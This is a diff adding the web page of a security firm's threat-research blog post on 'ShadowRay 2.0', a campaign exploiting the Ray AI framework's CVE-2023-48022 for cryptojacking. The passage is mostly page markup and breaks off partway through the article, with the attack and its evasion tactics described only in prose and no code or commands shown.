@@ -1,0 +1,1650 @@
+<!DOCTYPE html><!-- Last Published: Thu Jun 04 2026 20:03:11 GMT+0000 (Coordinated Universal Time) --><html data-wf-domain="www.oligo.security" data-wf-page="6978f85458109782dfd813f2" data-wf-site="69288487365aaac1f9887796" lang="en" data-wf-collection="6978f85458109782dfd813ea" data-wf-item-slug="shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet"><head><meta charset="utf-8"/><link href="https://cdn.prod.website-files.com" rel="preconnect" crossorigin="anonymous"/><title>ShadowRay 2.0: Active Global Campaign Hijacks Ray AI Infrastructure Into Self-Propagating Botnet</title><meta content="Oligo Security uncovers ShadowRay 2.0, an active global campaign exploiting Ray to hijack AI infrastructure and create a self-propagating botnet." name="description"/><meta content="ShadowRay 2.0: Active Global Campaign Hijacks Ray AI Infrastructure Into Self-Propagating Botnet" property="og:title"/><meta content="Oligo Security uncovers ShadowRay 2.0, an active global campaign exploiting Ray to hijack AI infrastructure and create a self-propagating botnet." property="og:description"/><meta content="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69edfa2c7f23c7856051c242_ShadowRay%202.0_%20Attackers%20Turn%20AI%20Against%20Itself%20in.jpg" property="og:image"/><meta content="ShadowRay 2.0: Active Global Campaign Hijacks Ray AI Infrastructure Into Self-Propagating Botnet" name="twitter:title"/><meta content="Oligo Security uncovers ShadowRay 2.0, an active global campaign exploiting Ray to hijack AI infrastructure and create a self-propagating botnet." name="twitter:description"/><meta content="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69edfa2c7f23c7856051c242_ShadowRay%202.0_%20Attackers%20Turn%20AI%20Against%20Itself%20in.jpg" name="twitter:image"/><meta property="og:type" content="website"/><meta content="summary_large_image" name="twitter:card"/><meta content="width=device-width, initial-scale=1" name="viewport"/><link href="https://cdn.prod.website-files.com/69288487365aaac1f9887796/css/oligo-staging.shared.a87cd5c2a.min.css" rel="stylesheet" type="text/css" integrity="sha384-qHzVwqLXaAqYn6r6w7U7wFwAWZJGiNv2iG8DdZA7B5Ru6qQcZAFitFF8DgUFVGeY" crossorigin="anonymous"/><script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script><link href="https://cdn.prod.website-files.com/69288487365aaac1f9887796/69a559c75f6ba06033bb43d2_Oligo%20Favicon.svg" rel="shortcut icon" type="image/x-icon"/><link href="https://cdn.prod.website-files.com/69288487365aaac1f9887796/69a55979baf6d83a3289d638_Webclip%20Oligo%20Security.svg" rel="apple-touch-icon"/><script src="https://www.google.com/recaptcha/api.js" type="text/javascript"></script><!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-PSNVMGKF');</script>
+<!-- End Google Tag Manager -->
+<!-- Finsweet Attributes -->
+<script async type="module"
+src="https://cdn.jsdelivr.net/npm/@finsweet/attributes@2/attributes.js"
+fs-scrolldisable
+></script>
+<!-- [Attributes by Finsweet] CMS Slider -->
+<script async src="https://cdn.jsdelivr.net/npm/@finsweet/attributes-cmsslider@1/cmsslider.js"></script>
+
+<style>
+hr
+  {
+  display: none !important;
+  }
+</style><!-- Finsweet Attributes -->
+<script async type="module"
+src="https://cdn.jsdelivr.net/npm/@finsweet/attributes@2/attributes.js"
+fs-toc
+></script>
+
+<!-- Finsweet Attributes -->
+<script async type="module"
+src="https://cdn.jsdelivr.net/npm/@finsweet/attributes@2/attributes.js"
+fs-readtime
+></script></head><body page-path="Resources;Blog;0"><div class="page-wrapper"><div class="global-styles w-embed"><style>
+  :root {
+    --font-from: 16;
+    --font-to: 20;
+    --vw-from: calc(1440 / 100);
+    --vw-to: calc(1920 / 100);
+    --coefficient: calc((var(--font-to) - var(--font-from)) / (var(--vw-to) - var(--vw-from)));
+    --base: calc((var(--font-from) - var(--vw-from) * var(--coefficient)) / 16);
+  }
+
+  html {
+    font-size: calc(var(--base) * 1rem + var(--coefficient) * 1vw);
+  }
+
+  @media screen and (max-width: 1440px) {
+    :root {
+      --font-from: 12;
+      --font-to: 16;
+      --vw-from: calc(960 / 100);
+      --vw-to: calc(1440 / 100);
+      }
+  }
+
+  @media screen and (max-width: 960px) {
+    :root {
+      --font-from: 12;
+      --font-to: 16;
+      --vw-from: calc(479 / 100);
+      --vw-to: calc(960 / 100);
+      }
+  }
+
+  @media screen and (max-width: 479px) {
+    :root {
+      --font-from: 12;
+      --font-to: 16;
+      --vw-from: calc(1 / 100);
+      --vw-to: calc(479 / 100);
+      }
+  }
+</style>
+
+
+<style>
+
+/* ============================
+   FIX 2 — MOBILE H2 SAFETY
+   ============================ */
+
+@media (max-width: 479px) {
+  .heading-style-h2 {
+    font-size: clamp(2.9rem, 9vw, 4rem);
+    line-height: 1.05;
+    max-width: 100%;
+  }
+}
+
+.line-height-trim::before {
+	content: "";
+  display: table;
+  margin-bottom: calc(0.5lh + 0.4em);
+}
+
+.line-height-trim::after {
+	content: "";
+  display: table;
+  margin-bottom: calc(0.5lh + 0.35em);
+}
+
+/* ============================
+   GLOBAL BASE STYLES
+   ============================ */
+
+/* Text rendering */
+body {
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  font-smoothing: antialiased;
+  text-rendering: optimizeLegibility;
+}
+
+/* Focus states */
+*[tabindex]:focus-visible,
+input[type="file"]:focus-visible {
+  outline: 0.125rem solid #4d65ff;
+  outline-offset: 0.125rem;
+}
+
+/* Inherit color */
+.inherit-color * {
+  color: inherit;
+}
+
+/* Rich text spacing fixes */
+.w-richtext > :not(div):first-child,
+.w-richtext > div:first-child > :first-child {
+  margin-top: 0 !important;
+}
+
+.w-richtext > :last-child,
+.w-richtext ol li:last-child,
+.w-richtext ul li:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* Container centering */
+.container-medium,
+.container-small,
+.container-large {
+  margin-left: auto !important;
+  margin-right: auto !important;
+}
+
+/* Line clamp utilities */
+.text-style-3lines {
+  display: -webkit-box;
+  overflow: hidden;
+  -webkit-line-clamp: 3;
+  -webkit-box-orient: vertical;
+}
+
+.text-style-2lines {
+  display: -webkit-box;
+  overflow: hidden;
+  -webkit-line-clamp: 2;
+  -webkit-box-orient: vertical;
+}
+
+/* Visibility utilities */
+.hide {
+  display: none !important;
+}
+
+@media (max-width: 991px) {
+  .hide,
+  .hide-tablet {
+    display: none !important;
+  }
+}
+
+@media (max-width: 767px) {
+  .hide-mobile-landscape {
+    display: none !important;
+  }
+}
+
+@media (max-width: 479px) {
+  .hide-mobile {
+    display: none !important;
+  }
+}
+
+/* Spacing utilities */
+.margin-0 { margin: 0rem !important; }
+.padding-0 { padding: 0rem !important; }
+
+.spacing-clean {
+  margin: 0rem !important;
+  padding: 0rem !important;
+}
+
+.margin-top {
+  margin-right: 0rem !important;
+  margin-bottom: 0rem !important;
+  margin-left: 0rem !important;
+}
+
+.padding-top {
+  padding-right: 0rem !important;
+  padding-bottom: 0rem !important;
+  padding-left: 0rem !important;
+}
+
+.margin-right {
+  margin-top: 0rem !important;
+  margin-bottom: 0rem !important;
+  margin-left: 0rem !important;
+}
+
+.padding-right {
+  padding-top: 0rem !important;
+  padding-bottom: 0rem !important;
+  padding-left: 0rem !important;
+}
+
+.margin-bottom {
+  margin-top: 0rem !important;
+  margin-right: 0rem !important;
+  margin-left: 0rem !important;
+}
+
+.padding-bottom {
+  padding-top: 0rem !important;
+  padding-right: 0rem !important;
+  padding-left: 0rem !important;
+}
+
+.margin-left {
+  margin-top: 0rem !important;
+  margin-right: 0rem !important;
+  margin-bottom: 0rem !important;
+}
+
+.padding-left {
+  padding-top: 0rem !important;
+  padding-right: 0rem !important;
+  padding-bottom: 0rem !important;
+}
+
+.margin-horizontal {
+  margin-top: 0rem !important;
+  margin-bottom: 0rem !important;
+}
+
+.padding-horizontal {
+  padding-top: 0rem !important;
+  padding-bottom: 0rem !important;
+}
+
+.margin-vertical {
+  margin-left: 0rem !important;
+  margin-right: 0rem !important;
+}
+
+.padding-vertical {
+  padding-left: 0rem !important;
+  padding-right: 0rem !important;
+}
+
+/* Webflow design mode helpers */
+.wf-design-mode a[href="#"],
+.wf-design-mode a[href=""] {
+  outline: 3px dashed red;
+  outline-offset: 3px;
+}
+
+/* SVG fix */
+svg {
+  width: 100%;
+  height: 100%;
+}
+
+/* Image reveal animation */
+.background-image.overflow-hidden .image-full.is-reveal {
+  clip-path: inset(0 100% 0 0);
+  transition: clip-path 0.8s ease;
+}
+
+.result-item:hover .image-full.is-reveal {
+  clip-path: inset(0 0 0 0);
+}
+</style></div><main class="main-wrapper"><div data-animation="default" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="navbar w-nav"><div class="padding-global in-navbar"><div class="max-width-full in-navbar"><div class="w-layout-vflex v-flex gap_small navbar-1"><div class="w-layout-hflex h-flex align-center-stretch gap-medium max-width-full nav-top-line"><a href="/" class="nav_brand w-nav-brand"><img src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a0b283acc44242f97968305_Oligo%20-%20Full%20Logo%20-%20Color.svg" loading="lazy" alt="" class="nav_logo"/></a><div class="w-layout-hflex h-flex align-center_stretch gap-medium flex-child-grow h-1-5rem"><div path-line="1" class="full-width-line"></div><a path-text="folder" href="#" class="page-path-link-block hidden">Text</a><div path-line="2" class="full-width-line hide-tablet hidden"></div><a path-text="subfolder" href="#" class="page-path-link-block hidden">Text</a><div path-line="3" class="full-width-line hide-tablet hidden"></div><a path-text="page" href="#" class="page-path-link-block hidden">Text</a><div path-line="4" class="full-width-line hide-tablet hidden"></div><div class="navbar-button"><div fs-scrolldisable-element="enable" data-w-id="0dccacc1-f882-f415-18b9-a186374e3046" class="close-navbar"><img src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/69645ed0b0d803527b0ad728_menu-open.png" loading="lazy" alt=""/></div><div fs-scrolldisable-element="disable" data-w-id="9aa9f429-bb3c-82c6-00ff-fcc830d0cd04" class="open-navbar is-closed"><img src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/69645ed054c71bc7ecb400e4_menu-closed.png" loading="lazy" alt=""/></div></div></div></div><div class="w-layout-hflex h-flex left-center gap-20px in-navbar"><div data-hover="true" data-delay="50" data-w-id="7a3ddb7b-792a-c746-d815-d3c823a3f3be" class="nav-dropdown w-dropdown"><div class="nav-dropdown-toggle w-dropdown-toggle"><div class="dropdown-trigger-wrapper"><div data-w-id="fc303015-6588-f211-79af-341f3eda2e92" class="link-text is-1">Platform</div><div class="link-text is-2">Platform</div></div><img src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/696488eba0ca3a5f69378072_navbar_arrow.png" loading="lazy" alt="" class="nav-dropdown-icon"/></div><nav class="nav-dropdown_list w-dropdown-list"><div class="dropdown-link_wrapper"><a data-w-id="7a3ddb7b-792a-c746-d815-d3c823a3f3c4" href="/runtime-platform/overview" class="nav-dropdown_link link-text w-dropdown-link">Overview</a></div><div class="dropdown-link_wrapper"><a data-w-id="bd20df38-3eca-e08c-d220-c988f02c969e" href="/runtime-platform/cloud-application-detection-and-response" class="nav-dropdown_link link-text w-dropdown-link">Runtime Protection</a></div><div class="dropdown-link_wrapper"><a data-w-id="3cc5bb70-2037-f065-c2fd-1e01287f13d4" href="/runtime-platform/runtime-vulnerability-management" class="nav-dropdown_link link-text w-dropdown-link">Runtime Posture</a></div><div class="dropdown-link_wrapper"><a data-w-id="2fd00876-39be-eab3-0ad8-ec2d26c09d94" href="/runtime-platform/runtime-ai" class="nav-dropdown_link link-text w-dropdown-link">Runtime AI Security</a></div></nav></div><div data-hover="true" data-delay="50" data-w-id="97de5e26-4073-2774-3afb-47fdcc0eb081" class="nav-dropdown w-dropdown"><div class="nav-dropdown-toggle w-dropdown-toggle"><div class="dropdown-trigger-wrapper"><div data-w-id="ca2b3258-562c-8e98-c35a-f4b2db4018bb" class="link-text is-1">Solutions</div><div class="link-text is-2">Solutions</div></div><img src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/696488eba0ca3a5f69378072_navbar_arrow.png" loading="lazy" alt="" class="nav-dropdown-icon"/></div><nav class="nav-dropdown_list with-columns w-dropdown-list"><div class="w-layout-vflex v-flex gap-20px height-stretch is-1"><div class="dropdown-link_wrapper"><div class="nav-dropdown_link text-style-eyebrow text-size-small">Who it&#x27;s for</div></div><div class="dropdown-link_wrapper"><a data-w-id="97de5e26-4073-2774-3afb-47fdcc0eb086" href="/solutions/security-leadership" class="nav-dropdown_link link-text w-dropdown-link">Security Leaders</a></div><div class="dropdown-link_wrapper"><a data-w-id="97de5e26-4073-2774-3afb-47fdcc0eb088" href="/solutions/security-operations" class="nav-dropdown_link link-text w-dropdown-link">SecOps Pros</a></div><div class="dropdown-link_wrapper"><a data-w-id="97de5e26-4073-2774-3afb-47fdcc0eb08c" href="/solutions/application-security" class="nav-dropdown_link link-text w-dropdown-link">AppSec Pros</a></div><div class="dropdown-link_wrapper"><a data-w-id="97de5e26-4073-2774-3afb-47fdcc0eb08e" href="/solutions/cloud-security" class="nav-dropdown_link link-text w-dropdown-link">CloudSec Pros</a></div></div><div class="w-layout-hflex h-flex align-bottom gap-huge is-2"><div class="w-layout-vflex v-flex gap-20px height-stretch"><div class="dropdown-link_wrapper"><div class="nav-dropdown_link text-style-eyebrow text-size-small">Use cases</div></div><div class="dropdown-link_wrapper"><a data-w-id="f29a39a3-2231-ce9f-0d17-a300620c00f0" href="/solutions/exploit-blocking" class="nav-dropdown_link link-text w-dropdown-link">Runtime Exploit Blocking</a></div><div class="dropdown-link_wrapper"><a data-w-id="f29a39a3-2231-ce9f-0d17-a300620c00f3" href="/solutions/real-time-bom" class="nav-dropdown_link link-text w-dropdown-link">Real-time bom/vex</a></div><div class="dropdown-link_wrapper"><a data-w-id="f29a39a3-2231-ce9f-0d17-a300620c00f6" href="/solutions/application-vulnerability-management" class="nav-dropdown_link link-text w-dropdown-link">Application vulnerability management</a></div><div class="dropdown-link_wrapper"><a data-w-id="f29a39a3-2231-ce9f-0d17-a300620c00f9" href="/solutions/ai-security-management" class="nav-dropdown_link link-text w-dropdown-link">AI security</a></div></div><div class="w-layout-vflex v-flex gap-20px layout-bottom height-stretch"><div class="dropdown-link_wrapper"><a data-w-id="86522381-6fc4-0ade-3ee4-af0be94e2069" href="/solutions/workload-protection" class="nav-dropdown_link link-text w-dropdown-link">Workload protection</a></div><div class="dropdown-link_wrapper"><a data-w-id="9f357b99-95dd-3dbc-e539-31edc3ad9ffe" href="/solutions/compliance-and-assurance" class="nav-dropdown_link link-text w-dropdown-link">Compliance and assurance</a></div><div class="dropdown-link_wrapper"><a data-w-id="9f357b99-95dd-3dbc-e539-31edc3ada000" href="/solutions/detection-and-response" class="nav-dropdown_link link-text w-dropdown-link">Attack detection and response</a></div><div class="dropdown-link_wrapper"><a data-w-id="9f357b99-95dd-3dbc-e539-31edc3ada002" href="/solutions/supply-chain-security" class="nav-dropdown_link link-text w-dropdown-link">Supply chain security</a></div></div></div></nav></div><div data-hover="true" data-delay="50" data-w-id="b34e129b-f385-5afd-4075-7890979ed206" class="nav-dropdown w-dropdown"><div class="nav-dropdown-toggle w-dropdown-toggle"><div class="dropdown-trigger-wrapper"><div data-w-id="9c2eb52c-1271-65f2-ea99-7e48fb99830e" class="link-text is-1">Customers</div><div class="link-text is-2">Customers</div></div><img src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/696488eba0ca3a5f69378072_navbar_arrow.png" loading="lazy" alt="" class="nav-dropdown-icon"/></div><nav class="nav-dropdown_list with-columns w-dropdown-list"><div class="w-layout-vflex v-flex gap-20px height-stretch in-navbar"><div class="dropdown-link_wrapper"><a data-w-id="b34e129b-f385-5afd-4075-7890979ed20e" href="/resources/case-studies" class="nav-dropdown_link link-text w-dropdown-link">All case studies</a></div><div class="dropdown-link_wrapper"><a data-w-id="b34e129b-f385-5afd-4075-7890979ed210" href="/case-study/cato-networks" class="nav-dropdown_link link-text w-dropdown-link">Cato Networks</a></div><div class="dropdown-link_wrapper"><a data-w-id="b34e129b-f385-5afd-4075-7890979ed212" href="/case-study/cryptocurrency-exchange" class="nav-dropdown_link link-text w-dropdown-link">Leading Crypto Exchange</a></div><div class="dropdown-link_wrapper"><a data-w-id="b34e129b-f385-5afd-4075-7890979ed214" href="/case-study/mural" class="nav-dropdown_link link-text w-dropdown-link">Mural</a></div><div class="dropdown-link_wrapper"><a data-w-id="2a73c393-4e6a-9415-bc94-aaef567014da" href="https://www.oligo.security/case-study/onetrust-case-study" class="nav-dropdown_link link-text w-dropdown-link">One Trust</a></div></div><div class="w-layout-vflex v-flex gap-20px layout-bottom height-stretch in-navbar"><div class="dropdown-link_wrapper"><a data-w-id="b34e129b-f385-5afd-4075-7890979ed224" href="/case-study/cresta-case-study" class="nav-dropdown_link link-text w-dropdown-link">Cresta</a></div><div class="dropdown-link_wrapper"><a data-w-id="b34e129b-f385-5afd-4075-7890979ed226" href="/case-study/financial-services-organization-secures-money-management-platform-with-oligo" class="nav-dropdown_link link-text w-dropdown-link">Major FinServ Company</a></div><div class="dropdown-link_wrapper"><a data-w-id="b34e129b-f385-5afd-4075-7890979ed22a" href="/nasdaq-company-case-study" class="nav-dropdown_link link-text w-dropdown-link">Nasdaq Traded Company</a></div><div class="dropdown-link_wrapper"><a data-w-id="88b9cd03-b9e6-cf6c-5445-f63ad9fcfbf7" href="/openweb-case-study" class="nav-dropdown_link link-text w-dropdown-link">Openweb</a></div></div></nav></div><div data-hover="true" data-delay="50" data-w-id="e85bfe41-b8c2-06f8-06ff-49e03724521d" class="nav-dropdown w-dropdown"><div class="nav-dropdown-toggle w-dropdown-toggle"><div class="dropdown-trigger-wrapper"><div data-w-id="9be042d5-94a5-1d4e-35bc-1ec68a7043d6" class="link-text is-1">Learn</div><div class="link-text is-2">Learn</div></div><img src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/696488eba0ca3a5f69378072_navbar_arrow.png" loading="lazy" alt="" class="nav-dropdown-icon"/></div><nav class="nav-dropdown_list w-dropdown-list"><div class="dropdown-link_wrapper"><a data-w-id="e85bfe41-b8c2-06f8-06ff-49e037245222" href="/resource-hub" class="nav-dropdown_link link-text w-dropdown-link">Resource hub</a></div><div class="dropdown-link_wrapper"><a data-w-id="9f6a7fcb-c85b-c4ed-7e86-db03f5df5705" href="/resources/blog" class="nav-dropdown_link link-text w-dropdown-link">Blog</a></div><div class="dropdown-link_wrapper"><a data-w-id="e85bfe41-b8c2-06f8-06ff-49e037245224" href="/academy" class="nav-dropdown_link link-text w-dropdown-link">Runtime academy</a></div><div class="dropdown-link_wrapper"><a data-w-id="e85bfe41-b8c2-06f8-06ff-49e037245228" href="/resources/news" class="nav-dropdown_link link-text w-dropdown-link">Newsroom</a></div><div class="dropdown-link_wrapper"><a data-w-id="e85bfe41-b8c2-06f8-06ff-49e03724522a" href="/resources/blog?category=Research" class="nav-dropdown_link link-text w-dropdown-link">Threat research</a></div><div class="dropdown-link_wrapper"><a data-w-id="b43c2e46-c2e4-eb7a-3bdc-736c4dcab468" href="https://app-attack-matrix.com/" class="nav-dropdown_link link-text w-dropdown-link">App attack matrix</a></div></nav></div><div data-hover="true" data-delay="0" data-w-id="795058dd-8b87-6059-d01a-2a1b4262e07c" class="nav-dropdown w-dropdown"><div class="nav-dropdown-toggle w-dropdown-toggle"><div class="dropdown-trigger-wrapper"><div data-w-id="7cc2b003-b622-5dfc-2b21-d23e48251e2b" class="link-text is-1">Company</div><div class="link-text is-2">Company</div></div><img src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/696488eba0ca3a5f69378072_navbar_arrow.png" loading="lazy" alt="" class="nav-dropdown-icon"/></div><nav class="nav-dropdown_list w-dropdown-list"><div class="dropdown-link_wrapper"><a data-w-id="795058dd-8b87-6059-d01a-2a1b4262e081" href="/company/about" class="nav-dropdown_link link-text w-dropdown-link">About Us</a></div><div class="dropdown-link_wrapper"><a data-w-id="f739d8de-55b3-a2e9-a83e-1bf19569f787" href="/company/why-oligo" class="nav-dropdown_link link-text w-dropdown-link">Why Oligo</a></div><div class="dropdown-link_wrapper"><a data-w-id="795058dd-8b87-6059-d01a-2a1b4262e083" href="/company/partners" class="nav-dropdown_link link-text w-dropdown-link">Partners</a></div><div class="dropdown-link_wrapper"><a data-w-id="795058dd-8b87-6059-d01a-2a1b4262e085" href="/company/careers" class="nav-dropdown_link link-text w-dropdown-link">Careers</a></div><div class="dropdown-link_wrapper"><a data-w-id="795058dd-8b87-6059-d01a-2a1b4262e087" href="/contact-us" class="nav-dropdown_link link-text w-dropdown-link">Contact Us</a></div></nav></div></div></div><div class="w-layout-vflex v-flex align-space-between navbar-2"><div class="hide-tablet"><a data-w-id="9e4c1c67-1be7-231d-4389-cd6a20e3dcf5" href="/demo" class="main-button w-inline-block"><div class="text-block-8">BOOK A DEMO</div><img data-w-id="9e4c1c67-1be7-231d-4389-cd6a20e3dcf8" loading="lazy" alt="" src="https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a0b2c3500914584e7983a6e_CTA%20icon.svg"/></a></div><div class="hide-desktop-only"><a data-wf--button-primary--base="red_h-border-v2" data-w-id="722e12bd-f923-9f5f-1ce8-eb26eabc2d87" href="/demo" class="cta-button w-variant-25e2ce2a-0531-37b9-645b-94874db5490b w-inline-block"><div class="overflow-hidden z-index-2"><div class="cta-text w-variant-25e2ce2a-0531-37b9-645b-94874db5490b is-1">Book a demo</div><div class="cta-text w-variant-25e2ce2a-0531-37b9-645b-94874db5490b is-2">Book a demo</div></div><div class="overflow-hidden z-index-2"><div class="cta-text w-variant-25e2ce2a-0531-37b9-645b-94874db5490b is-1">→</div><div class="cta-text w-variant-25e2ce2a-0531-37b9-645b-94874db5490b is-2">→</div></div><div class="cta-bg-wrapper w-variant-25e2ce2a-0531-37b9-645b-94874db5490b"><div class="cta-bg w-variant-25e2ce2a-0531-37b9-645b-94874db5490b"></div></div></a></div><a href="#" class="text-size-medium text-color-white variant-tablet search-bar">Search</a></div></div></div></div><section id="resource-hero" class="resource-hero padding-global"><div class="w-layout-hflex h-flex align-top align-stretch gap-medium"><div class="w-layout-vflex v-flex gap-20px"><div class="w-layout-hflex h-flex top-center"><div fs-readtime-element="time" class="text-size-small font-supply">1</div><div class="text-size-small font-supply">min read</div></div><h1 class="heading-style-h2">ShadowRay 2.0: Attackers Turn AI Against Itself in Global Campaign that Hijacks AI Into Self-Propagating Botnet</h1></div><div class="w-layout-grid resource-hero-grid text-style-allcaps in-blogs"><div class="w-layout-hflex h-flex top-center"><div class="text-size-small font-supply">Date:</div><div class="w-layout-vflex flex-block-2"><div class="text-size-small font-supply">Nov 18, 2025</div></div></div><div class="w-layout-hflex h-flex top-center"><div class="text-size-small font-supply">Category: </div><div class="w-layout-vflex flex-block-2"><div class="text-size-small font-supply">AI</div><div class="text-size-small font-supply">Research</div></div></div><div class="w-layout-hflex h-flex top-center"><div class="text-size-small font-supply">Author:</div><div class="w-layout-vflex flex-block-2"><div class="text-size-small font-supply">Avi Lumelsky</div><div class="text-size-small font-supply">Gal Elbaz</div></div></div></div></div></section><section class="resource-content-section padding-global"><div fs-toc-element="table" class="sticky-resource-menu-toc"><div class="toc-link-wrapper"><a href="#" fs-toc-element="link" class="text-style-allcaps in-sticky font-supply">Page top</a></div></div><div class="resource-content-wrapper"><img src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69edfa2c7f23c7856051c242_ShadowRay%202.0_%20Attackers%20Turn%20AI%20Against%20Itself%20in.jpg" loading="lazy" alt="" class="resource-hero-image"/><div fs-toc-offsettop="6.5rem" fs-toc-element="contents" fs-readtime-element="contents" fs-toc-hideurlhash="true" class="rich-text-block w-richtext"><p><strong><em>Oligo Security researchers have uncovered an ACTIVE global hacking campaign that uses AI to attack AI. The operation, dubbed ShadowRay 2.0, exploits a known, yet disputed, flaw in Ray, an open-source framework that powers many of today’s AI systems, to quietly seize control of powerful computing clusters and conscript them into a self-replicating botnet.</em></strong></p><p>In early November 2025, the Oligo Security research team identified an attack campaign exploiting the <a href="https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild">ShadowRay</a> vulnerability (<a href="https://nvd.nist.gov/vuln/detail/cve-2023-48022">CVE-2023-48022</a>) in Ray, a widely used open-source AI framework. This is the same flaw Oligo previously observed being exploited in late 2023 (see the new <a href="https://attack.mitre.org/campaigns/C0045/">MITRE, ShadowRay, Campaign C0045</a>). </p><p>For the recent campaign, attackers leveraged DevOps-style infrastructure by using GitLab as a platform for updating and delivering region-aware malware. Oligo reported this activity to Gitlab and the attacker repository and account was removed on November 5, 2025. However, Oligo has determined that the attackers have migrated to GitHub in order to continue their campaign as of November 10, 2025, creating multiple accounts and new repos. It remains active. </p><p>The latest campaign represents a major evolution from our initial ShadowRay discovery. The attackers, operating under the name <strong>IronErn440</strong>, have turned Ray’s legitimate orchestration features into tools for a self-propagating, globally cryptojacking operation, spreading autonomously across exposed Ray clusters.</p><p>What makes this campaign particularly notable is the <strong>use of AI to attack AI</strong>: our analysis shows attackers leveraged LLM-generated payloads to accelerate and adapt their methods. We also observed multiple criminal groups competing for the same CPU resources, often terminating legitimate workloads and rival cryptominers to maximize profits.</p><p>Equally concerning is the campaign’s operational sophistication. The attackers limited <strong>CPU usage to ~60% to evade detection</strong>, disguised malicious processes as legitimate services, and hid GPU usage from Ray’s monitoring to avoid detection while leveraging premium compute resources. In addition, the attackers employed a DevOps-style infrastructure by using GitLab for real-time, <strong>region-aware malware</strong> updates and delivery. </p><p>Evidence suggests the operation could have been active since September 2024, compromising Ray clusters across multiple continents through automated OAST-based discovery.</p><p>This isn’t just another cryptojacking campaign. It’s the foundation of a <strong>multi-purpose botnet</strong> capable of DDoS attacks, data exfiltration, and global autonomous propagation.</p><p>What is also highly concerning is that this vulnerability is “disputed” because the maintainers indicate that Ray is not intended for use outside a “strictly-controlled network environment”. In practice however, users often deploy Ray without heeding this warning, which creates an extended window for exploitation, evidenced by its continued and expanded weaponization by attackers in the wild. In fact, there are now more than 230,000 Ray servers exposed to the internet, in contrast to the few thousand we observed during our initial ShadowRay discovery.</p><p>Below, we walk through:</p><ul role="list"><li>The ShadowRay campaign from March 2024</li><li>The growth of exposed Ray servers </li><li>The new waves of attacks leveraging CVE-2023-48022</li><li>The attack group’s techniques</li><li>How the attackers have evaded detection</li><li>Recommendations for protection</li></ul><h2><strong>Why we looked into Ray (again)</strong></h2><p>Our renewed research into Ray began when we were looking into some customer environments and noticed that they were running Ray. While those instances were already protected through Oligo’s runtime security platform, the potential risk was flagged to ensure proper configuration and secure deployment of Ray, meaning no Oligo customer environments were impacted or targeted in this new attack campaign.</p><h2><strong>A History Lesson: The Original ShadowRay Campaign</strong></h2><p>In March 2024, Oligo <a href="https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild">unveiled ShadowRay</a>, a vulnerability that was leveraged in the first known attack campaign exploiting AI workloads in the wild. The attackers exploited CVE-2023-48022 that impacts Ray, the open-source AI framework commonly referred to as the “Kubernetes of AI.” The flaw allows unauthenticated remote code execution (RCE) through Ray’s Jobs API. </p><p>Our original research showed that thousands of exposed Ray servers had already been compromised across a variety of sectors. Attackers used them to run cryptominers, steal secrets, and exfiltrate data from live AI workloads. </p><p>While certain related issues were patched, CVE-2023-48022 itself was never directly fixed. The behavior in Ray is a design feature and is safe when used in a trusted environment that is not exposed to the internet. Following the disclosure, Ray maintainers issued configuration and deployment guidance, advising that “Security and isolation must be enforced outside of the Ray Cluster.”.</p><figure class="w-richtext-align-center w-richtext-figure-type-image"><div><img alt="" src="https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790ca1ea19100e154167ae_691bd9e2e579c4823eedccb7_67a88fc2.avif" loading="lazy"/></div><figcaption><em>Source: </em><a href="https://docs.ray.io/en/latest/ray-security/index.html"><em>https://docs.ray.io/en/latest/ray-security/index.html</em></a></figcaption></figure><p><em>DISCLAIMER: The new campaign does not relate to Anyscale’s (the developers of Ray) SaaS offerings or paid products. The sole intention of this blog is to support users of Ray by increasing awareness of its security aspects and common pitfalls.</em></p><p>At the same time, the broader security community has <a href="https://socket.dev/blog/google-osv-fix-adds-500-new-advisories">continued to treat CVE-2023-48022 as a legitimate vulnerability</a>. It is formally recognized in MITRE ATT&amp;CK, NIST’s National Vulnerability Database (NVD), and Google’s Open Source Vulnerabilities (OSV) platform.</p><p>This means that while the CVE can be detected in environments, there is not a specific version to upgrade to. Users are urged to follow the official <a href="https://docs.ray.io/en/latest/ray-security/index.html">Ray security guidelines</a> and also leverage <a href="https://github.com/ray-project/ray-open-ports-checker">this open-source tool</a> to verify proper configuration of their clusters to avoid accidental exposure.</p><h2><strong>The Growth of Exposed Ray Servers</strong></h2><p>Since early November 2025, our research team has identified significant renewed malicious activity in exposed Ray clusters around the world, nearly two years after us originally showing CVE-2023-48022 being exploited in the wild.</p><p>At the time of our original research, only thousands of exposed Ray servers were observed in the wild. Our scans today reveal that over 200,000 Ray servers remain exposed to the internet, with a portion confirmed as vulnerable or already compromised. Many of the exposed servers belong to active startups, research labs, and cloud-hosted AI environments, while some are honeypots. </p><p>The lack of a definitive patch, coupled with the assumption that users would self-secure their clusters, has allowed threat actors to weaponize the same underlying weakness, culminating in the new ShadowRay v2 campaign.<br/><br/></p><figure class="w-richtext-align-center 